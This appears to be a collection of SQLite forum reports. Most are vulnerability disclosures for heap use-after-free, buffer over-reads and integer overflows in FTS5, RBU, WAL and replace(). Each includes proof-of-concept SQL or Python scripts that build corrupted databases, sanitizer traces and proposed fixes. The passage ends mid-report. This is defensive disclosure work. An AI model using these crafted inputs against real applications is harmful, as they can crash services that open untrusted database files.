title: SELECT DISTINCT ORDER BY returns different row order depending on index usage

posts.author: ZyanLi
posts.body:
Description
When a table has a column with BLOB type affinity (no type coercion), and it stores two values that are numerically equal but have different SQLite storage classes — one INTEGER (1523828428) and one REAL (1523828428.0 / 1.523828428E9) — the following two issues arise:

DISTINCT fails to deduplicate: SELECT DISTINCT c0 FROM t0 returns two rows instead of one, even though SQLite itself considers these values equal. This is proven by the fact that CREATE UNIQUE INDEX on the same column correctly fails with "UNIQUE constraint failed", confirming SQLite knows they are the same value.
ORDER BY result order differs between index scan and table scan: The same query SELECT DISTINCT c0 FROM t0 ORDER BY c0 produces rows in a different order depending on whether the optimizer chooses an index scan or a full table scan:

Index scan (via i30): returns 1523828428 (integer) first, then 1523828428.0 (real)
Table scan (NOT INDEXED): returns 1523828428.0 (real) first, then 1523828428 (integer)

This violates the fundamental guarantee that the same SQL query must return identical results regardless of the execution plan chosen by the optimizer.

Reproduced on: SQLite 3.49.1
Does NOT reproduce on: SQLite 3.37.2 (system SQLite), suggesting this is a regression

This bug was discovered by an automated index fuzzer (SQLancer-based SQLite3IndexOracle) that cross-checks query results between index-based and full-scan execution plans.

How to Repeat
Step 1: Create a table with BLOB affinityCREATE TABLE t0 (c0 BLOB);

Step 2: Insert numerically equal values with different storage classesINSERT INTO t0(c0) VALUES (1.523828428E9);   -- stored as REAL: 1523828428.0
INSERT INTO t0(c0) VALUES (1523828428);        -- stored as INTEGER: 1523828428

Verify both types coexist:
SELECT c0, typeof(c0) FROM t0;
-- Output:
--   1523828428.0|real
--   1523828428|integer

Step 3: Create a DESC index and analyzeCREATE INDEX i30 ON t0(c0 DESC);
ANALYZE;

Step 4: Demonstrate the bug
Query using index scan:
EXPLAIN QUERY PLAN SELECT DISTINCT c0 FROM t0 ORDER BY c0;
-- Shows: using index i30

SELECT DISTINCT c0, typeof(c0) FROM t0 ORDER BY c0;
-- Output:
--   1523828428|integer
--   1523828428.0|real

Query using table scan (NOT INDEXED):
EXPLAIN QUERY PLAN SELECT DISTINCT c0 FROM t0 NOT INDEXED ORDER BY c0;
-- Shows: full table scan

SELECT DISTINCT c0, typeof(c0) FROM t0 NOT INDEXED ORDER BY c0;
-- Output:
--   1523828428.0|real
--   1523828428|integer

The two queries return the same rows but in opposite order — this is the bug.

Step 5: Additional proof that SQLite knows the values are equalCREATE UNIQUE INDEX i_fail ON t0(c0);
-- Error: UNIQUE constraint failed

This proves SQLite's own UNIQUE constraint logic recognizes 1523828428 (integer) and 1523828428.0 (real) as the same value. Yet DISTINCT fails to merge them, and ORDER BY produces inconsistent ordering.

Environment

Database: SQLite3
Affected version: 3.49.1
Not affected: 3.37.2 (likely a regression)

posts.author: dan
posts.body:
Thanks for the post, but this one is "NOT A BUG".

the fundamental guarantee that the same SQL query must return identical results regardless of the execution plan chosen by the optimizer

I don't think there is any such guarantee. Because the two values of "c0" are equal, SQLite is free to return the rows in either order without violating the ORDER BY clause. Both results are correct, therefore no bug.

Dan.

title: Vuln48-29: FTS5 NEAR Query Heap Use-After-Free via In-Place Poslist Rewrite Realloc

posts.author: ylwang (yuelinwang)
posts.body:
Summary
fts5ExprNearIsMatch() at ext/fts5/fts5_expr.c:743 aliases a reader and a writer on the same Fts5Buffer. Line 777 calls fts5LookaheadReaderInit(pPoslist->p, pPoslist->n, &a[i].reader) to capture a raw pointer into the poslist, then line 810 writes the trimmed NEAR result back into the same buffer via sqlite3Fts5PoslistWriterAppend(a[i].pOut, ...). The comment at line 767-774 claims this is safe because the trimmed subset cannot grow, but sqlite3Fts5PoslistWriterAppend at fts5_buffer.c:259 reserves 15 bytes of headroom before each append and routes through a sqlite3_realloc64() that frees the old block whenever pBuf->n + 15 > pBuf->nSpace. The reader's stale pointer then triggers a heap-use-after-free in the next sqlite3Fts5PoslistNext64() at fts5_expr.c:702. The subset-is-smaller invariant also fails in a second way because position-lists are delta-varint encoded, so dropping intermediate positions can produce a larger byte sequence. Reachable from any read-only MATCH 'NEAR(...)' whose per-phrase poslist crosses the realloc threshold.

PoC
SQL (vuln_001.sql):
CREATE VIRTUAL TABLE t USING fts5(x, tokenize=trigram);
INSERT INTO t VALUES('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa');
SELECT count(*) FROM t WHERE t MATCH 'NEAR(aaa aaa, 4)';

The trigram tokenizer turns the two 32-byte runs of a into a dense poslist of overlapping aaa positions, which is enough to push the NEAR trimming write past the original nSpace. The bug is tokenizer-independent and reproduces with any content that produces a sufficiently long per-phrase poslist (empirically about two runs of 32 identical characters or one run of roughly 60).

Run:
./sqlite3 < vuln_001.sql

ASAN output:
=================================================================
==995392==ERROR: AddressSanitizer: heap-use-after-free on address 0x507000002a5c
READ of size 1 at 0x507000002a5c thread T0
#0 sqlite3Fts5PoslistNext64    sqlite3.c:244698
#1 fts5LookaheadReaderNext     sqlite3.c:246756   (ext/fts5/fts5_expr.c:702)
#2 fts5ExprNearIsMatch         sqlite3.c:246876   (ext/fts5/fts5_expr.c:743)
#3 fts5ExprNearTest            sqlite3.c:246994
#4 fts5ExprNodeTest_STRING     sqlite3.c:247205
#5 fts5ExprNodeFirst           sqlite3.c:247585
#6 sqlite3Fts5ExprFirst        sqlite3.c:247618
#7 fts5CursorFirst             sqlite3.c:260629
#8 fts5FilterMethod            sqlite3.c:261110
#9 sqlite3VdbeExec             sqlite3.c:104070

freed by thread T0 here:
__interceptor_realloc
sqlite3Fts5BufferSize           ext/fts5/fts5_buffer.c:18
sqlite3Fts5PoslistWriterAppend  ext/fts5/fts5_buffer.c:259
fts5ExprNearIsMatch             ext/fts5/fts5_expr.c:810

The free site is sqlite3Fts5PoslistWriterAppend -> fts5BufferGrow -> sqlite3Fts5BufferSize -> sqlite3_realloc64. The read site is fts5LookaheadReaderNext -> sqlite3Fts5PoslistNext64 walking the stale pointer captured by fts5LookaheadReaderInit. Both stacks land back in fts5ExprNearIsMatch which is the same function performing the in-place rewrite.

Fix
Stop aliasing the reader and the writer on the same buffer. The cleanest patch writes the trimmed poslist into a separate Fts5Buffer scratch and swaps it in once the loop finishes:
Fts5Buffer tmp = {0,0,0};
fts5LookaheadReaderInit(pPoslist->p, pPoslist->n, &a[i].reader);
...
sqlite3Fts5PoslistWriterAppend(&tmp, pWriter, iPos);     /* writes to scratch */
...
sqlite3Fts5BufferSwap(pPoslist, &tmp);                   /* atomic handoff */
sqlite3Fts5BufferFree(&tmp);

A narrower fix that keeps the in-place pattern is to refresh a[i].reader.a = pPoslist->p after any append that may have reallocated, but the separate-scratch approach removes the fragile subset-is-smaller assumption entirely and is robust against the delta-varint expansion case as well.

title: Vuln49-30: FTS5 Reverse Iterator Heap Buffer Over-Read via Unvalidated szLeaf on Corrupt Segment Leaf

posts.author: ylwang (yuelinwang)
posts.body:
Summary
fts5SegIterReverseNewPage() at ext/fts5/fts5_index.c:2117 loads the previous leaf during a descending MATCH scan via fts5DataRead() at line 2126. Unlike fts5LeafRead() at line 922, which rejects pRet->szLeaf<4 || pRet->szLeaf>pRet->nn, fts5DataRead() takes szLeaf straight from the page bytes (fts5GetU16(&p[2])) with no validation. The reverse-paging code then bounds-checks the first-rowid offset only against this attacker-controlled szLeaf rather than the real page size nn, so a leaf whose szLeaf is inflated to 0x7FFF and whose first-rowid-offset is set past nn but below szLeaf passes the check and lands iLeafOffset far outside the nn-byte buffer (only 20 bytes of FTS5_DATA_PADDING trail it). The next fts5GetVarint() at line 2154 reads wildly out of bounds. Reachable from any MATCH ... ORDER BY rowid DESC query against an attacker-controlled .db file.

PoC
vuln_001_gen.py builds an FTS5 DB with pgsz=64 so the 'shared' doclist spans multiple leaf pages, then corrupts one leaf's first-rowid-offset (bytes 0-1) to nn+50 and its szLeaf (bytes 2-3) to 0x7FFF:
#!/usr/bin/env python3
import sqlite3, os
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.db")
if os.path.exists(OUT): os.remove(OUT)

conn = sqlite3.connect(OUT)
conn.execute("CREATE VIRTUAL TABLE t USING fts5(x)")
conn.execute("INSERT INTO t(t,rank) VALUES('pgsz', 64)")              # tiny leaf pages
for i in range(80):
conn.execute("INSERT INTO t VALUES(?)", (f"shared word{i%10} shared shared",))
conn.execute("INSERT INTO t(t) VALUES('optimize')")
conn.commit()

# Pick the first sufficiently large leaf and corrupt its header.
rid = conn.execute("SELECT id FROM t_data WHERE length(block)>8 LIMIT 1").fetchone()[0]
blk = bytearray(conn.execute("SELECT block FROM t_data WHERE id=?", (rid,)).fetchone()[0])
nn = len(blk)
blk[0:2] = ((nn + 50) >> 8 & 0xff, (nn + 50) & 0xff)                  # firstRowidOff > nn
blk[2:4] = (0x7F, 0xff)                                               # szLeaf = 0x7FFF
conn.execute("UPDATE t_data SET block=? WHERE id=?", (bytes(blk), rid))
conn.commit(); conn.close()
print(f"Wrote {OUT} (corrupted leaf id={rid}, nn={nn})")

Run:
python3 vuln_001_gen.py
./sqlite3 vuln_001.db "SELECT rowid FROM t WHERE t MATCH 'shared' ORDER BY rowid DESC;"

ASAN output:
=================================================================
==2792806==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50b0000012aa
READ of size 1 at 0x50b0000012aa thread T0
#0 sqlite3Fts5GetVarint          sqlite3.c:267305
#1 fts5SegIterReverseNewPage     sqlite3.c:252086   (ext/fts5/fts5_index.c:2154)
#2 fts5SegIterNext_Reverse       sqlite3.c:252139
#3 fts5MultiIterNext             sqlite3.c:253325
#4 sqlite3Fts5IterNext           sqlite3.c:257440
#5 fts5ExprNodeNext_TERM         sqlite3.c:247324
#6 sqlite3Fts5ExprNext           sqlite3.c:247651
#7 fts5NextMethod                sqlite3.c:260503
#8 sqlite3VdbeExec               sqlite3.c:104174

0x50b0000012aa is located 26 bytes to the right of 112-byte region [0x50b000001220,0x50b000001290)

The fault address sits 26 bytes past the real 112-byte page buffer, which matches the iRowidOff = nn + 50 corruption modulo the offset by which the varint reader has advanced. Forward (ascending) MATCH scans go through fts5LeafRead() and reject the same blob as corrupt, which is why earlier corrupt-DB fuzzing missed this path.

Fix
Load the previous leaf via fts5LeafRead() instead of fts5DataRead() in fts5SegIterReverseNewPage(), so the same szLeaf<4 || szLeaf>nn rejection at line 925 applies. A narrower alternative is to bounds-check iRowidOff against pNew->nn instead of pNew->szLeaf at line 2143:
if( iRowidOff>=pNew->nn ){
FTS5_CORRUPT_ITER(p, pIter);
}

Either fix breaks the read of attacker-controlled offset memory while preserving the legitimate descending-scan path.

title: Vuln50-31: FTS5 integrity-check Heap Buffer Over-Read in fts5IndexIntegrityCheckSegment

posts.author: ylwang (yuelinwang)
posts.body:
Summary
The dlidx verification block of fts5IndexIntegrityCheckSegment() at ext/fts5/fts5_index.c:8585 loads a leaf with the unvalidated fts5DataRead() (no szLeaf<4 || szLeaf>nn reject), reads the leaf's first-rowid offset, and checks it only against the page's own szLeaf field (bytes 2-3, attacker-controlled) rather than the real page size nn:
pLeaf = fts5DataRead(p, iKey);
if( pLeaf ){
i64 iRowid;
int iRowidOff = fts5LeafFirstRowidOff(pLeaf);
ASSERT_SZLEAF_OK(pLeaf);                          /* assert() only, no-op in release */
if( iRowidOff>=pLeaf->szLeaf ){                   /* line 8590, vs szLeaf not nn */
FTS5_CORRUPT_ROWID(p, iKey);
}else if( bSecureDelete==0 || iRowidOff>0 ){
i64 iDlRowid = fts5DlidxIterRowid(pDlidx);
fts5GetVarint(&pLeaf->p[iRowidOff], (u64*)&iRowid);   /* line 8594, OOB read */
...

A leaf whose szLeaf is inflated to 0x7FFF and whose first-rowid-offset is set past nn but below szLeaf passes the check and lands the varint reader far outside the page buffer. The reach path is the integrity-check command, which is what applications and operators run to validate an untrusted database. The trigger is INSERT INTO t(t) VALUES('integrity-check') -> fts5UpdateMethod -> fts5SpecialInsert -> sqlite3Fts5StorageIntegrity -> sqlite3Fts5IndexIntegrityCheck -> fts5IndexIntegrityCheckSegment. This is the integrity-check entry point, distinct from the descending-scan path of Vuln49, and survives the 2026-06-08 upstream fts5 corrupt-record hardening on HEAD 19a2ba1f5b.

PoC
vuln_001_gen.py builds an FTS5 DB with a prefix index and pgsz=80 so the doclist spans multiple leaves with a dlidx, then iterates segment leaves (skipping the structure record at t_data.id=10) corrupting one header at a time (bytes 0-1 = nn+50, bytes 2-3 = 0x7FFF) until ASAN catches the integrity-check OOB:
#!/usr/bin/env python3
import sqlite3, os, shutil, subprocess
HERE = os.path.dirname(os.path.abspath(__file__))
SEED = os.path.join(HERE, "_seed.db")
OUT  = os.path.join(HERE, "vuln_001.db")
SQ   = "/data/ylwang/LargeScan/targets/sqlite/sqlite3"
for f in (SEED, OUT):
if os.path.exists(f): os.remove(f)

c = sqlite3.connect(SEED)
c.execute("CREATE VIRTUAL TABLE t USING fts5(x, prefix='1 2 3')")
c.execute("INSERT INTO t(t,rank) VALUES('pgsz', 80)")                 # tiny leaf pages force dlidx
for i in range(100):
c.execute("INSERT INTO t VALUES(?)",
(f"shared common word{i%12} shared common tok{i}",))
c.execute("INSERT INTO t(t) VALUES('optimize')")
c.commit()
ids = [r[0] for r in c.execute(
"SELECT id FROM t_data WHERE id>10 AND length(block)>8").fetchall()]
c.close()

for rid in ids:
shutil.copy(SEED, OUT)
c = sqlite3.connect(OUT)
blk = bytearray(c.execute("SELECT block FROM t_data WHERE id=?", (rid,)).fetchone()[0])
nn = len(blk)
blk[0:2] = bytes([(nn+50) >> 8 & 0xff, (nn+50) & 0xff])           # firstRowidOff > nn
blk[2:4] = bytes([0x7f, 0xff])                                    # szLeaf = 0x7FFF
c.execute("UPDATE t_data SET block=? WHERE id=?", (bytes(blk), rid))
c.commit(); c.close()
r = subprocess.run([SQ, OUT],
input="INSERT INTO t(t) VALUES('integrity-check');\n",
capture_output=True, text=True, timeout=20)
if "AddressSanitizer" in r.stderr and "IntegrityCheck" in r.stderr:
print(f"Wrote {OUT} (corrupted leaf id={rid}, nn={nn})")
os.remove(SEED)
break
else:
raise SystemExit("no triggering leaf found")

Run:
python3 vuln_001_gen.py
./sqlite3 vuln_001.db "INSERT INTO t(t) VALUES('integrity-check');"

ASAN output:
=================================================================
==1734531==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50c0000018da
READ of size 1 at 0x50c0000018da thread T0
#0 sqlite3Fts5GetVarint                sqlite3.c:267305
#1 fts5IndexIntegrityCheckSegment      sqlite3.c:258526   (ext/fts5/fts5_index.c:8594)
#2 sqlite3Fts5IndexIntegrityCheck      sqlite3.c:258595
#3 sqlite3Fts5StorageIntegrity         sqlite3.c:264736
#4 fts5SpecialInsert                   sqlite3.c:261295
#5 fts5UpdateMethod                    sqlite3.c:261479
#6 sqlite3VdbeExec                     sqlite3.c:104285

The fault stack lands in the integrity-check pipeline rather than a query iterator, which is why the MATCH ... ORDER BY rowid DESC pattern (Vuln49) does not reach it and vice versa.

Fix
Load the leaf via fts5LeafRead() instead of fts5DataRead() at line 8585 so the same szLeaf<4 || szLeaf>nn reject at fts5_index.c:925 applies. A narrower one-line alternative is to bounds-check against the real page size at line 8590:
if( iRowidOff>=pLeaf->nn ){
FTS5_CORRUPT_ROWID(p, iKey);
}

title: Vuln52-33: replace() Bounds-Check Assert Signed Integer Overflow on Large Strings Under Raised SQLITE_MAX_LENGTH

posts.author: ylwang (yuelinwang)
posts.body:
Summary
replaceFunc() in src/func.c finishes the tail copy with a bounds-check assert at line 1583:
assert( j+nStr-i+1<=nOut );           /* line 1583 */
memcpy(&zOut[j], &zStr[i], nStr-i);
j += nStr - i;
assert( j<=nOut );

j, nStr and i are all int. The expression evaluates left to right, so the subterm j + nStr is computed first. When both j and nStr exceed ~2^30, that intermediate overflows the signed int even though the fully-reduced value j + nStr - i + 1 is small. Reachable from a single pure-SQL replace() over a string longer than ~1.07e9 bytes, which is only possible when SQLITE_MAX_LENGTH is raised above ~2^30 (the project build sets 2100000000). On the project build (--enable-debug plus -fsanitize=signed-integer-overflow -fno-sanitize-recover=all) the assert compiles in and UBSAN aborts the process. On a normal release build the assert compiles out and replace() returns the correct result, because the real arithmetic at line 1585 (j += nStr - i) evaluates nStr - i first and does not overflow. This is a debug-build / UBSAN-cleanliness bug, benign in release. Same raised-SQLITE_MAX_LENGTH int-overflow class as Vuln51 but in a core SQL function reachable without any special tokenizer.

PoC
SQL (vuln_001.sql):
SELECT length(replace(hex(zeroblob(550000000)), 'q', 'r'));

hex(zeroblob(550000000)) yields a 1.1e9-character string. The pattern 'q' is absent so no actual replacement happens, the output cursor j just walks to the end of the input, and the tail assert evaluates j + nStr with both operands at 1.1e9.

Run on a build with --enable-debug -DSQLITE_MAX_LENGTH=2100000000 -fsanitize=signed-integer-overflow -fno-sanitize-recover=all:
./sqlite3 < vuln_001.sql

UBSAN output:
sqlite3.c:134514:3: runtime error: signed integer overflow: 1100000000 + 1100000000 cannot be represented in type 'int'

sqlite3.c:134514 maps to src/func.c:1583. UBSAN aborts the connection because of -fno-sanitize-recover=all. A release/no-assert build returns 1100000000 normally.

Fix
Widen the intermediate so the addition cannot overflow:
assert( (i64)j + nStr - i + 1 <= nOut );

title: Vuln54-35: RBU rbu_fossil_delta Signed Integer Overflow on Crafted Delta Output Size

posts.author: drh
posts.body: Fixed by check-in 8531c0c3b6177159.

posts.author: ylwang (yuelinwang)
posts.body:
Summary
rbuFossilDeltaFunc() at ext/rbu/sqlite3rbu.c:698-740 is the SQL backend for the rbu_fossil_delta(orig, delta) function that RBU uses internally to apply fossil-format deltas during sqlite3rbu_step(). It reads the declared output size out of the delta header and sizes the output allocation with nOut+1:
nOut = rbuDeltaOutputSize(aDelta, nDelta);   /* line 721, returns int */
if( nOut<0 ){
sqlite3_result_error(context, "corrupt fossil delta", -1);
return;
}
aOut = sqlite3_malloc(nOut+1);               /* line 727, int+1 overflows at INT_MAX */

rbuDeltaOutputSize returns an int parsed from the delta header. The nOut<0 guard rejects header values above INT_MAX (which decode to negative), but a declared size of exactly INT_MAX (0x7FFFFFFF) passes the guard, and the subsequent nOut + 1 overflows the signed int. The header field is not decimal: rbuDeltaGetInt decodes a base-64 value (0-9 A-Z _ a-z ~ map to digits 0-63), so INT_MAX encodes as the six-character string 1~~~~~, which is why this is easy to overlook.

rbu_fossil_delta is registered only on RBU's internal dbMain connection (ext/rbu/sqlite3rbu.c:2930), so reaching it requires the application to call sqlite3rbu_open(target, rbu) and sqlite3rbu_step() on an attacker-controlled rbu.db. That is the documented RBU use case (apply a remote update). On the project build (--enable-debug -fsanitize=signed-integer-overflow -fno-sanitize-recover=all) UBSAN aborts the process. On a release build nOut+1 wraps to INT_MIN, sqlite3_malloc rejects the non-positive size and returns NULL, so the function reports NOMEM and the RBU step fails cleanly. Release is undefined-but-benign.

PoC
Use the SQLite-shipped rbu command-line tool (ext/rbu/rbu.c, built from the same source tree as sqlite3) so the trigger is "build a malicious .db with the sqlite3 shell, then apply it with the official RBU CLI". No custom C harness is needed.

Build the RBU CLI tool with the same UBSAN flags as sqlite3:
gcc -O0 -g -fsanitize=address,undefined,signed-integer-overflow \
-fno-sanitize-recover=all -fno-omit-frame-pointer \
-DSQLITE_DEBUG=1 -DSQLITE_ENABLE_RBU \
-DSQLITE_MAX_SQL_LENGTH=2100000000 -DSQLITE_MAX_LENGTH=2100000000 \
-I. ext/rbu/rbu.c sqlite3.c \
-lm -lpthread -ldl -o ./rbu

Construct the victim target DB and the malicious rbu.db with pure SQL:
-- target.sql
CREATE TABLE t1(a INTEGER PRIMARY KEY, b TEXT);
INSERT INTO t1 VALUES(1,'orig');
-- rbu.sql: row marks column b as fossil-delta ('f'); the delta blob declares
-- output size INT_MAX in fossil base-64 encoding ('1~~~~~'), then a minimal
-- valid tail ('\n:x;').
CREATE TABLE data_t1(a, b, rbu_control);
INSERT INTO data_t1 VALUES(
1,
CAST('1~~~~~' || char(10) || ':x;' AS BLOB),
'.f'
);

Run:
rm -f target.db rbu.db target.db-oal target.db-wal
./sqlite3 target.db < target.sql
./sqlite3 rbu.db    < rbu.sql
./rbu target.db rbu.db

UBSAN output:
sqlite3.c:226138:10: runtime error: signed integer overflow: 2147483647 + 1 cannot be represented in type 'int'

sqlite3.c:226138 maps to ext/rbu/sqlite3rbu.c:727. The call chain inside the rbu tool is sqlite3rbu_step -> rbuStep -> UPDATE t1 SET b=rbu_fossil_delta(b, ?) WHERE a=? -> rbuFossilDeltaFunc -> sqlite3_malloc(nOut+1). The attack surface is exactly the documented RBU usage pattern (apply a remote update DB), with the malicious input being a normal .db file the operator hands to the standard rbu CLI.

Fix
Size the allocation in 64-bit so the addition cannot overflow:
aOut = sqlite3_malloc64((i64)nOut + 1);

title: WAL read-only `readonly_shm` path accepts page-size 0 and over-reads in `walChecksumBytes()`

posts.author: Haoyu Li (Jet_Li)
posts.body:
Summary
src/wal.c:walBeginShmUnreliable() is used by a read-only WAL connection when the shared-memory file exists but cannot be initialized (readonly_shm=1 / SQLITE_READONLY_CANTINIT). In this path, SQLite copies the heap-memory wal-index header into pWal->hdr and then trusts pWal->szPage when allocating a frame buffer:
/* src/wal.c:2880s */
assert( (pWal->szPage & (pWal->szPage-1))==0 );
assert( pWal->szPage>=512 && pWal->szPage<=65536 );
szFrame = pWal->szPage + WAL_FRAME_HDRSIZE;
aFrame = (u8 *)sqlite3_malloc64(szFrame);
aData = &aFrame[WAL_FRAME_HDRSIZE];

Those checks are assertions only. In a release build, pWal->szPage==0 is still accepted. walDecodeFrame() then calls:
walChecksumBytes(nativeCksum, aData, pWal->szPage, aCksum, aCksum);

With pWal->szPage==0, this passes nByte==0 to walChecksumBytes(). That function also only asserts that nByte>=8; the checksum loop is a do/while, so it reads at least one word group even though aEnd == aData. Because aData points immediately after the 24-byte WAL frame header allocation, the first checksum read is already out of bounds.

The concrete sequence is:

Open a database through the official sqlite3 shell using file:...?mode=ro&readonly_shm=1.
Provide a WAL file with page-size 0 in its WAL header and a minimal existing -shm file, so the read-only unreliable-shm path is taken.
walBeginShmUnreliable() allocates only WAL_FRAME_HDRSIZE bytes, sets aData to the end of that allocation, and walChecksumBytes(..., nByte==0) reads past the heap buffer.

Impact: a corrupt database directory containing a crafted db, db-wal, and db-shm can crash a read-only SQLite process that opens it with readonly_shm=1. I have only demonstrated a read overrun / denial of service, not a write primitive.

PoC
The following Python script is self-contained. It creates a normal seed database with Python's sqlite3 module, then writes the malformed WAL and minimal SHM files needed for the official SQLite shell to trigger the bug.

It generates:

poc_invalid_wal.db
poc_invalid_wal.db-wal
poc_invalid_wal.db-shm
cli_repro.sql

Save as make_wal_repro.py:
#!/usr/bin/env python3
from __future__ import annotations

import os
import sqlite3
import struct
import tempfile
from pathlib import Path

WALINDEX_MAX_VERSION = 3007000

def make_seed(tmpdir: Path) -> bytes:
db = tmpdir / "seed.db"
con = sqlite3.connect(db)
con.execute("PRAGMA page_size=4096")
con.execute("CREATE TABLE t(x INTEGER PRIMARY KEY, y TEXT)")
con.execute("INSERT INTO t(y) VALUES ('seed')")
con.commit()
con.close()
return db.read_bytes()

def write_invalid_wal_repro(outdir: Path) -> None:
outdir.mkdir(parents=True, exist_ok=True)
prefix = outdir / "poc_invalid_wal.db"

with tempfile.TemporaryDirectory(dir=outdir) as td:
seed_db = make_seed(Path(td))
prefix.write_bytes(seed_db)

# Invalid WAL header: page-size 0 leaves pWal->szPage==0 on this path.
wal = bytearray(32 + 24)
struct.pack_into(">I", wal, 0, 0x377F0682)          # WAL magic
struct.pack_into(">I", wal, 4, WALINDEX_MAX_VERSION)
struct.pack_into(">I", wal, 8, 0)                   # invalid page size
struct.pack_into(">I", wal, 12, 0)                  # checkpoint sequence
struct.pack_into(">I", wal, 32, 1)                  # first frame pgno
struct.pack_into(">I", wal, 36, 0)                  # non-commit frame
prefix.with_name(prefix.name + "-wal").write_bytes(wal)

# readonly_shm=1 requires an existing SHM file to enter the SQLITE_READONLY_CANTINIT / walBeginShmUnreliable path.
prefix.with_name(prefix.name + "-shm").write_bytes(
b"SHM-UNUSED-IN-READONLY-CANTINIT\n"
)

(outdir / "cli_repro.sql").write_text(
".open 'file:poc_invalid_wal.db?mode=ro&readonly_shm=1'\n"
"SELECT count(*) FROM sqlite_schema;\n",
encoding="ascii",
)

if __name__ == "__main__":
write_invalid_wal_repro(Path(os.getcwd()))

Build the official shell with ASan/UBSan, then generate and run the repro:
# from a SQLite source checkout
mkdir -p build-asan
cd build-asan
../configure CC=clang CFLAGS='-fsanitize=address,undefined -g -O1' LDFLAGS='-fsanitize=address,undefined'
make sqlite3

mkdir -p /tmp/sqlite-wal-repro
cd /tmp/sqlite-wal-repro
python3 /path/to/make_wal_repro.py

ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1 /path/to/sqlite/build-asan/sqlite3 :memory: < ./cli_repro.sql

No custom VFS, custom SQLite source changes, or non-public API calls are needed. The repro uses the stock sqlite3 shell and the .open command to exercise the normal URI open path.

Sanitizer output==910120==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000000450
READ of size 4 at 0x603000000450 thread T0
#0 walChecksumBytes sqlite3.c:67293
#1 walDecodeFrame sqlite3.c:67441
#2 walBeginShmUnreliable sqlite3.c:69313
#3 walTryBeginRead sqlite3.c:69523
#10 sqlite3BtreeBeginTrans sqlite3.c:75923
#11 sqlite3InitOne sqlite3.c:147257
#17 sqlite3Prepare sqlite3.c:147781
#20 shell_exec shell.c:28029
#23 main shell.c:38728

0x603000000450 is located 0 bytes to the right of 32-byte region
[0x603000000430,0x603000000450)

SUMMARY: AddressSanitizer: heap-buffer-overflow sqlite3.c:67293 in walChecksumBytes

The stack matches the sequence above: shell input opens the crafted WAL database, schema initialization starts a read transaction, the read-only unreliable-shm path allocates a 24-byte frame buffer because the WAL page size is 0, and walChecksumBytes() immediately reads from aData, which points just past that allocation.

Possible fix direction
One possible fix direction would be to enforce the page-size invariant at runtime before walBeginShmUnreliable() uses pWal->szPage to size the frame buffer. The debug assertions already describe the expected invariant; the crash happens because a release build can continue with pWal->szPage==0.

For example, a guard before computing szFrame seems like it would break this path:
if( pWal->szPage<512
|| pWal->szPage>SQLITE_MAX_PAGE_SIZE
|| (pWal->szPage & (pWal->szPage-1))!=0
){
rc = WAL_RETRY;  /* or another existing corruption/recovery path */
goto begin_unreliable_shm_out;
}

It may also be worth checking whether walChecksumBytes() should defensively handle an invalid nByte in release builds, since the current precondition is assertion-only.

title: CREATE INDEX with LIKE accepted, then SQLITE_CORRUPT after `PRAGMA case_sensitive_like` change

posts.author: ZyanLi
posts.body:
Summary
An index whose expression uses LIKE() is accepted by CREATE INDEX and
written to sqlite_master. A subsequent change to
PRAGMA case_sensitive_like, followed by any operation that causes the
schema to be re-parsed (VACUUM, or simply a fresh connection),
makes SQLite report
SQLITE_CORRUPT: malformed database schema (<index>) - non-deterministic functions prohibited in index expressions

The on-disk file is otherwise fine; only the schema re-parser refuses it. CREATE INDEX is accepted and persisted, but once the bug is triggered every subsequent statement — SELECT, INSERT, UPDATE, DELETE, even reading sqlite_master — fails with the same SQLITE_CORRUPT error until case_sensitive_like is restored to the value in effect at CREATE INDEX time. The result is that a single, fully-documented, per-connection PRAGMA can put a healthy database into a state that is indistinguishable from on-disk corruption to applications.

Versions tested (both reproduce, every time)

SQLite 3.49.1 (sqlite-jdbc-3.49.1.0.jar)
SQLite 3.50.4 (Python's stock sqlite3 module on Windows)

Minimal reproducer A (single connection, in-memory works)
3 SQL statements, no JDBC required:
CREATE TABLE t0(c0, c1);
CREATE INDEX i ON t0(c0 LIKE c0);
PRAGMA case_sensitive_like = ON;
VACUUM;
SELECT * FROM sqlite_master;
-- Error: malformed database schema (i) -
--        non-deterministic functions prohibited in index expressions

Equivalent in Python:
import sqlite3
c = sqlite3.connect(":memory:")
c.executescript(
"CREATE TABLE t0(c0, c1);"
"CREATE INDEX i ON t0(c0 LIKE c0);"
)
c.execute("PRAGMA case_sensitive_like=ON;")
c.execute("VACUUM;")
c.execute("SELECT * FROM sqlite_master;").fetchall()
# sqlite3.DatabaseError: malformed database schema (i) -
# non-deterministic functions prohibited in index expressions

Minimal reproducer B (cross-connection, no VACUUM)
VACUUM is not even required. Closing the connection and reopening the file under a different case_sensitive_like setting is enough:
-- session 1
CREATE TABLE t0(c0, c1);
CREATE INDEX i ON t0(c0 LIKE c0);
-- close

-- session 2 (same file)
PRAGMA case_sensitive_like = ON;
SELECT * FROM sqlite_master;
-- => same SQLITE_CORRUPT

What appears to be going on
LIKE's determinism depends on the current value of PRAGMA case_sensitive_like:

CREATE INDEX validates the expression with the current PRAGMA value. With the default (case-insensitive) LIKE, the expression is treated as deterministic, the index is accepted, and the CREATE INDEX statement is persisted into sqlite_master.
A later schema re-parse (forced by VACUUM, or by reopening the connection) is performed under the current PRAGMA value, which may now be different. Under the new value, LIKE is judged to be non-deterministic, and the previously-accepted CREATE INDEX statement in sqlite_master is rejected, surfacing as SQLITE_CORRUPT (malformed database schema).

So the engine has two code paths that disagree about the same schema text, and the disagreement is reachable purely by issuing a documented PRAGMA.

posts.author: drh
posts.body:
See the documentation for PRAGMA case_sensitive_like, and
in particular the following statements:

WARNING: If a database uses the LIKE operator ... in an expression index ..., then changing the definition of the LIKE operator using this PRAGMA can cause the database to appear to be corrupt.
This pragma is deprecated .... avoid using this pragma.

WONT FIX

title: Vuln57-38: FTS3 matchinfo() Heap Buffer Overflow via 32-bit size_t Wraparound in fts3MatchinfoSize

posts.author: ylwang (yuelinwang)
posts.body:
Summary
fts3MatchinfoSize() at ext/fts3/fts3_snippet.c:1035 sizes the matchinfo output buffer with a 32-bit size_t multiplication on the HITS ('x') format:
case FTS3_MATCHINFO_LHITS:                          /* line 1026, 'y' */
